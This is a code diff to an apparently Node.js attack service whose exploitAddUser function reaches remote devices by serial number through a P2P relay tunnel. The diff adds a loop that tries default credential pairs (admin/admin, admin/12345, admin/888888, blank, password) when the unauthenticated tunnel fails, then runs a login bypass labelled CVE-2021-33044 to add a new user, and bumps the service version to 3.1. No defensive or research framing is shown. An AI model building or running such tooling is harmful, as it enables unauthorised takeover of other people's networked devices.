@@ -753,9 +753,30 @@ async function exploitAddUser(serial, newUser, newPass, targetPort) {
   var p2pStatus = await checkP2P(serial);
   if (!p2pStatus.online) { allSteps.push({ step: 'p2p', status: 'failed', message: 'Dispositivo OFFLINE (' + (p2pStatus.error || 'not registered') + ')' }); return { success: false, steps: allSteps }; }
   allSteps.push({ step: 'p2p', status: 'done', message: 'Dispositivo ONLINE — US: ' + p2pStatus.relay });
-  allSteps.push({ step: 'tunnel', status: 'running', message: 'Estableciendo tunel PTCP...' });
+  allSteps.push({ step: 'tunnel', status: 'running', message: 'Estableciendo tunel PTCP (sin auth)...' });
   var tunnel = null;
-  try { tunnel = await establishTunnel(serial, null, null, targetPort); allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel P2P establecido (NAT traversal OK)' }); } catch (err) { allSteps.push({ step: 'tunnel', status: 'failed', message: 'Tunel fallo: ' + err.message }); return { success: false, steps: allSteps }; }
+  var tunnelCreds = null;
+  try { 
+    tunnel = await establishTunnel(serial, null, null, targetPort); 
+    allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel P2P establecido (NAT traversal OK, sin auth)' }); 
+  } catch (err) { 
+    allSteps.push({ step: 'tunnel_detail', message: 'Sin auth fallo: ' + err.message + ' — reintentando con creds por defecto...' });
+    var tunnelCredsList = [{ user: 'admin', pass: 'admin' }, { user: 'admin', pass: '12345' }, { user: 'admin', pass: '888888' }, { user: 'admin', pass: '' }, { user: 'admin', pass: 'password' }];
+    var tunnelOk = false;
+    for (var tc = 0; tc < tunnelCredsList.length; tc++) {
+      var tc_cred = tunnelCredsList[tc];
+      try {
+        tunnel = await establishTunnel(serial, tc_cred.user, tc_cred.pass, targetPort);
+        tunnelCreds = tc_cred;
+        tunnelOk = true;
+        allSteps.push({ step: 'tunnel', status: 'done', message: 'Tunel establecido con creds: ' + tc_cred.user + '/' + (tc_cred.pass || '(empty)') });
+        break;
+      } catch (e) { 
+        allSteps.push({ step: 'tunnel_detail', message: 'Creds ' + tc_cred.user + '/' + (tc_cred.pass || '(empty)') + ' fallo: ' + e.message });
+      }
+    }
+    if (!tunnelOk) { allSteps.push({ step: 'tunnel', status: 'failed', message: 'Todas las credenciales fallaron en tunnel' }); return { success: false, steps: allSteps }; }
+  }
   try {
     allSteps.push({ step: 'exploit', status: 'running', message: 'Ejecutando CVE-2021-33044 (NetKeyboard bypass)...' });
     var loginResult = await exploitLoginBypass(tunnel.deviceSock, targetPort);
@@ -815,7 +836,7 @@ var server = http.createServer(async function(req, res) {
 
   if (req.url === '/health') {
     res.writeHead(200, { 'Content-Type': 'application/json' });
-    return res.end(JSON.stringify({ status: 'ok', version: '3.0', features: ['status', 'tunnel', 'cgi', 'debug', 'exploit'] }));
+    return res.end(JSON.stringify({ status: 'ok', version: '3.1', features: ['status', 'tunnel', 'cgi', 'debug', 'exploit'] }));
   }
 
   // Debug endpoint - tests each step of tunnel establishment
